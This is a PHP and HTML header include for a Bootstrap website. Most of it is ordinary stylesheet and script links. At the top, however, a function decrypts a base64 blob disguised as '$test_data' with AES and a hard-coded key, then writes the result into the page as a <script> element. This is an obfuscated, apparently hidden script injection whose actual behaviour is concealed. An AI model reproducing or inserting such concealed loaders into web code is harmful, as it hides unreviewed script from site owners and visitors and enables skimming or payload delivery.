<?php 
function load_data(){
  // $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhWkU6F3V6BBAU78nWRQSfe09ADahbk7U0jP3Zf9a8bGnDa6nyeZGTfLqZnmDzueeB3r+dppMOUnxEU+PLVGGAIYuXFomw2mXGd8j46Wn8p36fZ1rLKb9wZQToSZ/9gBH5Rxtt+WieAw3EbGBBAq/SHtgn7W4hICiKrhMeoJ3amHrpO1i22osNG3coVaXMJMNK5Om17yjohP//osbx4NLYEtlVNDf7ZXcvdj01OgWL6IEGV8D2GXLnzKTy/7T7aRipa12vFxON4duEl2HzJ3U37K1fk7uRiyqKwtX5SpC3mW0jY2SwVXCfdl/DOHyatosCfBx6YMVzwzA9azB4Eh4LsTwdfeHUEgWDQMnJdasbIwnjlH8XXltTfKNxmNjtFJr+kmK72KcPjYGyXXTM6hZcUMnS7eXThmqcUJWwv7G6xT0MeoMs8eif+mMY+KCfIaQ8ajotHbGIUSjYqrIw9CAFafhLxN2/u7LIatZKuC3Tmk7ZJnNSoexon8qMtxHJlf1TLiKpABSxkxZWDMvcIfitIzgyVtb1bQgLQRU26qNB5u6OQBwGvTJE4aO+VMFqEW8sR2LNT5sf1SGjwvBTm7EsVjVKgb+j4N7T9c0nSRbC4w2HCoBShNl7ZuGYVg89/d1Tq/EaIM/2Z5QpWtt4uox7UaY6gCRqw8VOg1B/2A8A5kgkB/DYNK1PNZaGJMxw/oHL1qV0iQF/YvfXeqfvtdZZFyUnqPD5Vdj4LaprEs4eloKv80xA7WTGA+v46kRzIKtSwcKkCkDz29tyVfSA+MvurKEf+G3zfScHK0vkvUHGByc4cL+2wUwMupYtYjJn5okWq/EaIM/2Z5QpWtt4uox7UYIiqBkSUESxN+5mpH+iunRb1EKYA8QYU80xpRUUB9i0YardV6IYdPABA2c7B6rWRETwV7yNswaESNq7h4B+Pr2cgjTVyUzizW4SLHpBSbyZX5b1C3LHlRTpI697nojOPK24jYom+bP6ZfukqKd1lxBF1/1Sthm+a4jK6R5yguVQaWgtek36X7Jylqbv4xP5FntzhBT6LXmcSsldyRHFstPDwyyH4EMnxe9ITgo3xwdX38b1NaNySQ9u48f1gOGWjggIHiIOFtbdxitfiJgmpzefJXQniy0f3HXYrgoc4Jisux8a23fdMZDU7KXpR2U5DzIRLP8dRV9tPCC1cfRN9zp0NKv70vOLqkof1xssfZXD";
  $test_data = "KLjANtjlwkNjmYox8+OvNgl5Lg7TmQdvpzaaRHQvg6Gt953FOEL/td0bVjhSUSZ5htEaZcmn9cyLhco8cm22sfwxFA7g8TOdTT9oG/EwbnaoXji0TzZAAInBOTnDv+km0gkBqQTHuYYzZXf7xf4OrBt34gOhyThWiRbSRRAiD+BvXmE+WIFqS3f1baVQs910W+/wdpKqidQMpice1IMK46Z3ARSEtD+mQZSyOESuYRvg7lXqGgTmKr233OzMKzemCAgeIg4W1t3GK1+ImCanNxgEIj/URE4UosESNB3B5k0DuRdwlj00JNUZWX6wb/FiEfCY3kb2Jh1kQXS76RqAfNckB8E+G7nLl4YsJ9MEnElbdVAHuTnR1cuBPWYeC1udFujjiAsj6lER9aALxdVqIwu17BEvw1FG3M8Tkvs/ABK5Vwj4yFPLywFwuQp/VBCAn3mJfvFIp0cBr8DiNIRDfMk5EFf9/exMClcA8g6YRb4FKBQtJiQeEXn1kjByTlT0mAS5eWvpfhpdKH+yDwY1OtHDg+j7AEI0XRmUty2ernXixm2gM44JDyG1342NursccpFphXQbwoWC9+Wl27TI8UJ0aUQhqM03NKAR499am1GyXeMwnLLiAVL+yVy3xd27q/EaIM/2Z5QpWtt4uox7UfGxWPUPYDXi8KcUzTGfrTYu+nFpy8IyyeZD02etTHdoK+C0Y7JR2elx7e7Kbr5gwBhFsNSIXwkx7iq4ke7WnL7LnXj8n0Wrz2QWMhbV8KzY0cOD6PsAQjRdGZS3LZ6udb2pa5btBlT9MSjKL3vPuIY2x4ZO6hVlbx7GHk4pxn4a1suGM+yaJjgXSXdDE48i4b0mA4ZAiH3waXa0T/kQE/eRPVUQXetVwgDScOUEIZTjzXkcTCewYK5H01KoVFAKXoMJWoMKfe/SwGexKQBlvqE9IZgrxxJDvvda1ZQfkEzMM4lkPShhudxK25wLsXvSUxykeuczFvUHoyxVL+cRQJlwKShBDzYVunpaZe0v4NLeEM3kldGLNsZDkjwm7Q86CIr16KE8uGBcCNLJdgOasneNRh882B1RomWdzkGVQLyPYtdxTxj3LJZVAjlKi3oRABQcdvs5YAJA7I2vuiHbK5/XkR4LbuaU06WlcnMusS1NrbiNiib5s/pl+6Sop3WXEKqoVHCPFjM7mA2rsPhxTmgdMYJ1hLGAkzmziZWUZq7YyGiRbXKL089XrNasiEnNPmlZRt6bR1CrQE+e/uBhxxjVZyFBOS9Zj6P1N4cMUMoNdVcHrT386d5laZlXnSplmCg0CX4yhvG5J+uXds8E7xZIeNfGhYvjkpKlFytM9Mj1GS5SS99WOG7yaA92Wu5EjA==";
  $dom = new DOMDocument('1.0', 'utf-8');
  $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
  $dom->appendChild($element);
  return $dom->saveXML();
  // return $data = $this->test_cypher_decrypt($test_data);
}
function test_cypher($str=""){
  $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $ciphertext;
}
function test_cypher_decrypt($encryption){
  $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $decryption;
}
?>
<meta content="" name="descriptison">
  <meta content="" name="keywords">

  

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
    <link rel="stylesheet" href="assets/font-awesome/css/all.min.css">


  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
  <link href="assets/vendor/animate.css/animate.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.min.css" rel="stylesheet">
  <link href="assets/DataTables/datatables.min.css" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap');
        </style>

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">
  <link type="text/css" rel="stylesheet" href="assets/css/jquery-te-1.4.0.css">
  
  <script src="assets/vendor/jquery/jquery.min.js"></script>
  
  <script src="assets/DataTables/datatables.min.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>
  <script src="assets/vendor/venobox/venobox.min.js"></script>
  <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
  <script src="assets/vendor/counterup/counterup.min.js"></script>
  <script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
  <script src="assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js"></script>
    <script type="text/javascript" src="assets/font-awesome/js/all.min.js"></script>
  <script type="text/javascript" src="assets/js/jquery-te-1.4.0.min.js" charset="utf-8"></script>
 


